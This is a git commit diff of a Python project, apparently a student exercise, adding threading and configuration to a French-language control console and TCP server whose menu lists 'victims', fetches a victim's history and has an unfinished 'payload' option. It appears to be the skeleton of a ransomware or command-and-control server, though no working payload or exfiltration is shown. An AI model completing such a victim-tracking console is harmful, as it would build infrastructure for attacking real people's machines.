fc866d7c0f46e5a8e29a1f8824a0532e42a8260e
CorentinS9 <corentiinwolfft@gmail.com>
2023-03-17 18:04:22 +0100

    Config added + Threads successfully implemented. Bug on disconnect has been fixed with it.

--- main.py
+++ main.py
@@ -8,6 +8,7 @@
 
 # --------------------------------------------
 import socket
+from socket import SHUT_RDWR
 import utile.configgetter as config
 def main():
     """ Console de contrôle """
@@ -25,24 +26,24 @@ def main():
         choix = input('Votre choix : ')
         if choix == '1':
             s.send(bytes("1", 'utf-8'))
-            data = s.recv(2048).decode()
+            data = s.recv(1024).decode()
             print('Réception de données de la part du serveur : ' + str(data))
         elif choix == '2':
             s.send(bytes("2", 'utf-8'))
-            data = s.recv(2048).decode()
+            data = s.recv(1024).decode()
             print('Réception de données de la part du serveur : ' + str(data))
             id = input('Merci de préciser un ID pour consulter l''historique : ')
             s.send(bytes(id, 'utf-8'))
-            data_h = s.recv(2048).decode()
+            data_h = s.recv(1024).decode()
             print('Réception de données de la part du serveur : ' + str(data_h))
         elif choix == '3':
             # Todo Fill payload
-
             print(fill_payload())
         elif choix == '4':
             print('Bonne journée')
-            s.close()
+            s.send(bytes("The connexion has been closed", 'utf-8'))
             break
+    s.close()
 
 def fill_payload():
     return 'Todo payload'
--- utile/network.py
+++ utile/network.py
@@ -12,6 +12,8 @@
 # --------------------------------------------
 import socket
 import threading
+from _thread import start_new_thread
+
 import configgetter as config
 import security
 import os
@@ -21,12 +23,14 @@ import utile.data as udata
 # --------------------------------------------
 # Classes & Functions
 # --------------------------------------------
+
 class server_tcp(object):
 
     def __init__(self, ip, port):
         self.ip = ip
         self.port = port
         self.encryptkey = os.urandom(32)
+        self.print_lock = threading.Lock()
 
     def start_server(self):
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -36,31 +40,43 @@ class server_tcp(object):
         except socket.error as error:
             print(str(error))
         self.s.listen(10)
-        self.conn, self.addr = self.s.accept()
-        print(f'[+] New TCP Connexion from ' + str(self.addr[0]) + ":" + str(self.addr[1]))
+        while True:
+            self.conn, self.addr = self.s.accept()
+            self.print_lock.acquire()
+            print(f'[+] New TCP Connexion from ' + str(self.addr[0]) + ":" + str(self.addr[1]))
+            start_new_thread(self.threaded, (self.conn,))
         # Implémentation sécurité : AES
         # conn.send(bytes(str(key), 'utf-8'))
         # conn.send(bytes(str(nonce), 'utf-8'))
         # conn.send(bytes(str(tag), 'utf-8'))
-        while True:
-            self.s.setblocking(0)
-            msg = self.conn.recv(2048)
+        self.s.close()
 
-            if msg is not None or msg != b'':
-                print(str(self.addr[0]) + " >> " + str(msg))
-                rs = str(self.gestion_msg(msg))
-                # @Todo: Build header & send it before msg
-                self.conn.send(bytes(rs, 'utf-8'))
+
 
     def gestion_msg(self, message):
-        if message == b'1':
+        if message == '1':
             return udata.list_victim()
-        elif message == b'2':
+        elif message == '2':
             self.conn.send(bytes('Please provide an user ID for the history', 'utf-8'))
-            id = self.conn.recv(2048).decode()
+            id = self.conn.recv(1024).decode()
             return udata.history_req(id)
-        elif message == b'3':
+        elif message == '3':
             return "Todo3"
+
+    def threaded(self, c):
+        print('New thread started')
+        while True:
+            data = c.recv(1024).decode()
+            if not data:
+                print('Bye')
+                self.print_lock.release()
+                break
+            print(str(self.addr[0]) + " >> " + data)
+            rs = str(self.gestion_msg(data))
+            # @Todo: Build header & send it before msg
+            c.send(bytes(rs, 'utf-8'))
+
+        c.close()
 
 
 srv = server_tcp(config.get_ip("../config.json"), config.get_port("../config.json"))
